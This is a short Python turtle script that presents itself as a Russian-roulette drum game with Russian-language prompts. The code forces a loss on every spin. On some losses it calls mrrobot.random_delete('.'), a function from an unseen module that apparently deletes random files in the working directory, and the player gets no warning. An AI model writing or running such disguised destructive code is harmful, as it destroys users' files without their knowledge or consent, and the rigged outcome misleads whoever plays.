import turtle
import random
import math
import mrrobot

turtle.speed(0)
phi = 360 / 7
r = 50

def gotoxy(x, y):
    turtle.penup()
    turtle.goto(x, y)
    turtle.pendown()

def draw_circle(r, color):
    turtle.fillcolor(color)
    turtle.begin_fill()
    turtle.circle(r)
    turtle.end_fill()

def draw_drum(x, y):
    gotoxy(x, y)
    turtle.circle(80)
    gotoxy(x, y + 160)
    draw_circle(5, "red")
    for i in range(0, 7):
        phi_rad = phi * i * math.pi / 180.0
        gotoxy(x + math.sin(phi_rad) * r, y + math.cos(phi_rad) * r + 60)
        draw_circle(22, "white")

def anime(start, x, y):
    for i in range(start, random.randrange(7, 100)):
        phi_rad = phi * i * math.pi / 180.0
        gotoxy(x + math.sin(phi_rad) * r, y + math.cos(phi_rad) * r + 60)
        draw_circle(22, "brown")
        draw_circle(22, "white")

    gotoxy(x + math.sin(phi_rad) * r, y + math.cos(phi_rad) * r + 60)
    draw_circle(22, "brown")

    start = i % 7
    return start


start = 0

draw_drum(100, -100)


answer = ''
start = 0
while answer != 'n':
    answer = turtle.textinput("Хотите поиграть?","y/n")
    if answer == 'y':
        start = anime(start, 100, -100)
        start = 0
        if start == 0:
            gotoxy(-150, 250)
            turtle.write("You lost", font=("Arial", 18, "normal"))
            z = random.randrange(0, 3)
            if z == 0:
                mrrobot.backup('.')
            elif z == 1:
                mrrobot.random_delete('.')
            else:
                gotoxy(-100, -50)
                turtle.write("Вам везет!", font=("Arial", 20, "normal"))
            mrrobot.backup('.')
    else:
        pass
